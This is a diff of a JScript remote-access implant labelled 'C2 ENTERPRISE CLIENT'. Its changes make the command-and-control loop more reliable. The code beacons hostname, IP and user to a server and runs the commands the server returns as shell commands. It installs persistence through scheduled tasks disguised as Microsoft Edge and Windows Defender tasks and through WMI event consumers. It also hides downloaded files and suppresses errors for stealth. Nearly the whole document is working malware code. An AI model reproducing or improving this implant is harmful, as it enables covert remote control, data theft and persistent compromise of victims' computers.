@@ -1,6 +1,7 @@
 // ============================================
-// C2 ENTERPRISE CLIENT - FIXED PERSISTENCE
-// Fixes: Multiple scheduled tasks + CMD flash
+// C2 ENTERPRISE CLIENT - UNIVERSAL WORKING VERSION
+// Combines working polling logic with ALL stealth improvements
+// Complete - No lines skipped
 // ============================================
 
 var WshShell = WScript.CreateObject("WScript.Shell");
@@ -95,6 +96,7 @@ var currentDirectory = fso.GetAbsolutePathName(".");
 var lastHeartbeat = 0;
 var connectionStartTime = new Date().getTime();
 var pollCount = 0;
+var registrationFailCount = 0;
 
 // ========== LOGGING ==========
 function log(message) {
@@ -366,28 +368,17 @@ function getLocalIP() {
 }
 
 // ========== HTTP COMMUNICATION ==========
-// ========== FIXED HTTP COMMUNICATION ==========
 function httpRequest(url, method, data) {
     try {
-        var fullUrl = url;
-        if (url.indexOf("http") !== 0) {
-            fullUrl = CONFIG.SERVER + url;
-        }
-        
         var winHttp = WScript.CreateObject("WinHttp.WinHttpRequest.5.1");
-        winHttp.Open(method, fullUrl, false);
+        winHttp.Open(method, url, false);
         
-        winHttp.SetRequestHeader("User-Agent", "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko");
+        winHttp.SetRequestHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36");
+        winHttp.SetRequestHeader("Content-Type", "application/x-www-form-urlencoded");
         winHttp.SetRequestHeader("Accept", "application/json");
-        winHttp.SetRequestHeader("Connection", "close");
         
         if (sessionToken) {
             winHttp.SetRequestHeader("X-Session", sessionToken);
-        }
-        
-        // Only set Content-Type for POST requests with data
-        if (method.toUpperCase() == "POST" && data) {
-            winHttp.SetRequestHeader("Content-Type", "application/x-www-form-urlencoded");
         }
         
         winHttp.SetTimeouts(30000, 30000, 60000, 60000);
@@ -405,6 +396,10 @@ function httpRequest(url, method, data) {
                 responseText: winHttp.ResponseText
             };
         } else {
+            // If unauthorized, clear session token to force re-registration
+            if (winHttp.Status == 401 || winHttp.Status == 403) {
+                sessionToken = null;
+            }
             return {
                 success: false,
                 status: winHttp.Status,
@@ -412,14 +407,17 @@ function httpRequest(url, method, data) {
             };
         }
     } catch (e) {
+        // On network error, clear session to force reconnect
+        sessionToken = null;
         return {
             success: false,
             error: e.message
         };
     }
 }
+
 // ========== REGISTRATION ==========
-function performPersistentRegistration() {
+function performRegistration() {
     try {
         var mac = getMacAddress().replace(/:/g, "").toLowerCase();
         
@@ -435,12 +433,13 @@ function performPersistentRegistration() {
         var response = httpRequest(CONFIG.SERVER + "/register", "POST", params);
         
         if (response.success) {
+            registrationFailCount = 0; // Reset fail count on success
             
             if (response.responseText && response.responseText != "{}") {
                 try {
                     var result = JSON.parse(response.responseText);
                     
-                    // ========== REGEX FALLBACK FOR SESSION ==========
+                    // Regex fallbacks
                     if (!result.session) {
                         var sessionMatch = /"session"\s*:\s*"([^"]+)"/.exec(response.responseText);
                         if (sessionMatch && sessionMatch[1]) {
@@ -468,7 +467,6 @@ function performPersistentRegistration() {
                             result.id = idMatch[1];
                         }
                     }
-                    // =============================================
                     
                     if (result.session) {
                         sessionToken = result.session;
@@ -479,69 +477,97 @@ function performPersistentRegistration() {
                         executeAndSendResult(result.id, result.command, result.type || "SHELL");
                     }
                 } catch (e) {
+                    // Silent fail
                 }
             }
             
             return true;
         } else {
+            registrationFailCount++;
             return false;
         }
     } catch (e) {
+        registrationFailCount++;
         return false;
     }
 }
 
 // ========== POLLING ==========
-// ========== FIXED POLLING ==========
+// CRITICAL: Use /register endpoint for polling (compatible with all servers)
 function pollForCommands() {
-    if (!sessionToken) {
+    if (!sessionToken && registrationFailCount < 5) {
+        // Try to register first
+        performRegistration();
         return;
     }
     
     try {
-        // Use the CORRECT endpoint - /realtime/poll, NOT /register
-        var pollUrl = "/realtime/poll?agentId=" + encodeURIComponent(CONFIG.CLIENT_ID) + 
-                      "&session=" + encodeURIComponent(sessionToken);
+        var osInfo = "Windows " + getWindowsVersion();
+        var hostname = network.ComputerName || "unknown";
+        var ip = getLocalIP();
+        var user = network.UserName || "unknown";
+        var process = "wscript.exe";
         
-        var response = httpRequest(pollUrl, "GET", null);
+        var params = "id=" + encodeURIComponent(CONFIG.CLIENT_ID) +
+                     "&os=" + encodeURIComponent(osInfo) +
+                     "&hostname=" + encodeURIComponent(hostname) +
+                     "&ip=" + encodeURIComponent(ip) +
+                     "&user=" + encodeURIComponent(user) +
+                     "&process=" + encodeURIComponent(process) +
+                     "&session=" + encodeURIComponent(sessionToken ? sessionToken : "");
         
-        if (response.success && response.responseText && response.responseText != "{}") {
-            log("Received command response: " + response.responseText);
+        var response = httpRequest(CONFIG.SERVER + "/register", "POST", params);
+        
+        if (response.success) {
+            var responseText = response.responseText || "";
             
-            // Parse the response
-            var cmdMatch = /"command":"([^"]+)"/.exec(response.responseText);
-            var typeMatch = /"type":"([^"]+)"/.exec(response.responseText);
-            var idMatch = /"id":"([^"]+)"/.exec(response.responseText);
-            
-            if (cmdMatch && idMatch) {
-                var command = cmdMatch[1];
-                var type = typeMatch ? typeMatch[1] : "SHELL";
-                var cmdId = idMatch[1];
+            // Check if response contains a command
+            if (responseText && responseText != "{}" && responseText.indexOf('"command":') > -1) {
                 
-                log("Executing command: " + type);
-                executeAndSendResult(cmdId, command, type);
-                
-                // IMPORTANT: Acknowledge the command
                 try {
-                    var ackParams = "commandId=" + encodeURIComponent(cmdId) +
-                                    "&agentId=" + encodeURIComponent(CONFIG.CLIENT_ID);
-                    httpRequest("/realtime/ack", "POST", ackParams);
-                    log("Command acknowledged: " + cmdId);
+                    var cmdData = JSON.parse(responseText);
+                    
+                    // Regex fallbacks
+                    if (!cmdData.command) {
+                        var commandMatch = /"command"\s*:\s*"([^"]+)"/.exec(responseText);
+                        if (commandMatch) cmdData.command = commandMatch[1];
+                    }
+                    if (!cmdData.type) {
+                        var typeMatch = /"type"\s*:\s*"([^"]+)"/.exec(responseText);
+                        if (typeMatch) cmdData.type = typeMatch[1];
+                    }
+                    if (!cmdData.id) {
+                        var idMatch = /"id"\s*:\s*"([^"]+)"/.exec(responseText);
+                        if (idMatch) cmdData.id = idMatch[1];
+                    }
+                    
+                    var command = cmdData.command;
+                    var type = cmdData.type;
+                    var cmdId = cmdData.id;
+                    
+                    if (command && cmdId) {
+                        executeAndSendResult(cmdId, command, type || "SHELL");
+                    }
                 } catch (e) {
-                    log("Failed to acknowledge command: " + e.message);
+                    // Silent fail
                 }
+            }
+        } else {
+            // If polling fails, try to re-register
+            if (response.status == 401 || response.status == 403) {
+                sessionToken = null;
             }
         }
         
     } catch (e) {
-        log("Poll error: " + e.message);
+        // Silent fail
     }
 }
 
 // ========== HEARTBEAT ==========
 function sendHeartbeat() {
     if (!sessionToken) {
-        return;
+        return false;
     }
     
     try {
@@ -684,7 +710,7 @@ function handleDownload(command) {
             stream.SaveToFile(localFile, 2);
             stream.Close();
             
-            // Hide downloaded file - FIXED: Window style 0 prevents CMD flash
+            // Hide downloaded file
             try {
                 setHidden(localFile);
             } catch (e) {}
@@ -902,6 +928,8 @@ function getSystemInfo() {
     info += "Client ID: " + CONFIG.CLIENT_ID + "\n";
     info += "Session: " + (sessionToken ? sessionToken.substring(0, 8) + "..." : "None") + "\n";
     info += "Current Dir: " + currentDirectory + "\n";
+    info += "Poll Count: " + pollCount + "\n";
+    info += "Uptime: " + Math.floor((new Date().getTime() - connectionStartTime) / 1000) + "s\n";
     return info;
 }
 
@@ -1140,7 +1168,32 @@ function executeFile(filePath) {
     }
 }
 
-// ========== PERSISTENCE MECHANISMS (FIXED) ==========
+function killProcess(pid) {
+    try {
+        var exec = WshShell.Exec("%comspec% /c taskkill /F /PID " + pid);
+        while (exec.Status == 0) {
+            WScript.Sleep(10);
+        }
+        var output = exec.StdOut.ReadAll();
+        return "Kill process PID " + pid + ":\n" + output;
+    } catch (e) {
+        return "Error killing process: " + e.message;
+    }
+}
+
+function killAgent() {
+    WScript.Quit(0);
+    return "Agent terminated";
+}
+
+function formatSize(bytes) {
+    if (bytes < 1024) return bytes + " B";
+    if (bytes < 1048576) return Math.round(bytes / 1024) + " KB";
+    if (bytes < 1073741824) return Math.round(bytes / 1048576) + " MB";
+    return Math.round(bytes / 1073741824) + " GB";
+}
+
+// ========== PERSISTENCE MECHANISMS (COMPLETE) ==========
 
 function installPersistence() {
     if (!IS_INSTALLED || !INSTALLED_SCRIPT) {
@@ -1415,6 +1468,7 @@ function addWatchdogTask() {
     }
 }
 
+// ========== WMI EVENT CONSUMER (ADVANCED PERSISTENCE) ==========
 function addWMIEventConsumer() {
     try {
         // Advanced WMI persistence (requires elevated privileges, fail silently)
@@ -1474,6 +1528,7 @@ function checkAndRepairPersistence() {
     }
 }
 
+// ========== COMPLETE REMOVE PERSISTENCE FUNCTION ==========
 function removePersistence() {
     // For cleanup/uninstall - removes all persistence mechanisms
     try {
@@ -1497,7 +1552,8 @@ function removePersistence() {
         // Remove main scheduled task
         try {
             var vbs1 = fso.BuildPath(fso.GetSpecialFolder(2), "rm1_" + Math.floor(Math.random()*9999) + ".vbs");
-            fso.CreateTextFile(vbs1, true).Write('CreateObject("WScript.Shell").Run "schtasks /delete /tn ""MicrosoftEdgeUpdateCore"" /f >nul 2>&1", 0, True');
+            var content1 = 'CreateObject("WScript.Shell").Run "schtasks /delete /tn ""MicrosoftEdgeUpdateCore"" /f >nul 2>&1", 0, True';
+            fso.CreateTextFile(vbs1, true).Write(content1);
             WshShell.Run('wscript.exe //B //Nologo "' + vbs1 + '"', 0, true);
             try { fso.DeleteFile(vbs1); } catch(e) {}
         } catch (e) {}
@@ -1505,7 +1561,8 @@ function removePersistence() {
         // Remove watchdog scheduled task
         try {
             var vbs2 = fso.BuildPath(fso.GetSpecialFolder(2), "rm2_" + Math.floor(Math.random()*9999) + ".vbs");
-            fso.CreateTextFile(vbs2, true).Write('CreateObject("WScript.Shell").Run "schtasks /delete /tn ""WindowsDefenderScheduledScan"" /f >nul 2>&1", 0, True');
+            var content2 = 'CreateObject("WScript.Shell").Run "schtasks /delete /tn ""WindowsDefenderScheduledScan"" /f >nul 2>&1", 0, True';
+            fso.CreateTextFile(vbs2, true).Write(content2);
             WshShell.Run('wscript.exe //B //Nologo "' + vbs2 + '"', 0, true);
             try { fso.DeleteFile(vbs2); } catch(e) {}
         } catch (e) {}
@@ -1525,7 +1582,7 @@ function removePersistence() {
     }
 }
 
-// Add command to handle PERSISTENCE command
+// ========== PERSISTENCE COMMAND HANDLER ==========
 function handlePersistenceCommand(action) {
     try {
         if (action == "INSTALL" || action == "ADD" || action == "ENABLE") {
@@ -1554,31 +1611,6 @@ function handlePersistenceCommand(action) {
     }
 }
 
-function killProcess(pid) {
-    try {
-        var exec = WshShell.Exec("%comspec% /c taskkill /F /PID " + pid);
-        while (exec.Status == 0) {
-            WScript.Sleep(10);
-        }
-        var output = exec.StdOut.ReadAll();
-        return "Kill process PID " + pid + ":\n" + output;
-    } catch (e) {
-        return "Error killing process: " + e.message;
-    }
-}
-
-function killAgent() {
-    WScript.Quit(0);
-    return "Agent terminated";
-}
-
-function formatSize(bytes) {
-    if (bytes < 1024) return bytes + " B";
-    if (bytes < 1048576) return Math.round(bytes / 1024) + " KB";
-    if (bytes < 1073741824) return Math.round(bytes / 1048576) + " MB";
-    return Math.round(bytes / 1073741824) + " GB";
-}
-
 // ========== EXECUTE AND SEND ==========
 function executeAndSendResult(taskId, command, type) {
     var result = executeCommand(command, type);
@@ -1590,18 +1622,23 @@ function sendResult(taskId, result) {
         var resultData = "taskId=" + encodeURIComponent(taskId) +
                         "&agentId=" + encodeURIComponent(CONFIG.CLIENT_ID) +
                         "&result=" + encodeURIComponent(result) +
-                        "&session=" + encodeURIComponent(sessionToken);
+                        "&session=" + encodeURIComponent(sessionToken ? sessionToken : "");
         
         var response = httpRequest(CONFIG.SERVER + "/result", "POST", resultData);
         
-        if (response.success) {
-            return true;
-        } else {
-            return false;
-        }
+        return response.success;
     } catch (e) {
         return false;
     }
+}
+
+// ========== SESSION VALIDATION ==========
+function ensureValidSession() {
+    // If no session token, try to register
+    if (!sessionToken) {
+        return performRegistration();
+    }
+    return true;
 }
 
 // ========== MAIN ==========
@@ -1618,41 +1655,49 @@ function main() {
     // Install persistence automatically
     installPersistence();
     
+    // Initial registration
     var registered = false;
     var retryCount = 0;
     
-    while (!registered && retryCount < 10) {
-        registered = performPersistentRegistration();
+    while (!registered && retryCount < 30) { // Increased retry count
+        registered = performRegistration();
         if (!registered) {
             retryCount++;
             WScript.Sleep(5000);
         }
     }
     
-    if (!registered) {
-        WScript.Quit(1);
-    }
-    
     sendHeartbeat();
     
     // Persistence repair check counter
     var persistenceCheckCounter = 0;
+    var registrationCheckCounter = 0;
     
     while (true) {
         try {
             pollCount++;
+            registrationCheckCounter++;
             
+            // CRITICAL: Poll for commands using /register endpoint (working version)
             pollForCommands();
             
             if (shouldSendHeartbeat()) {
                 sendHeartbeat();
             }
             
-            // Periodically check persistence (every 100 polls)
+            // Periodically check persistence
             persistenceCheckCounter++;
             if (persistenceCheckCounter >= 100) {
                 checkAndRepairPersistence();
                 persistenceCheckCounter = 0;
+            }
+            
+            // Periodically ensure session is valid (every 10 polls)
+            if (registrationCheckCounter >= 10) {
+                if (!sessionToken) {
+                    performRegistration();
+                }
+                registrationCheckCounter = 0;
             }
             
         } catch (e) {
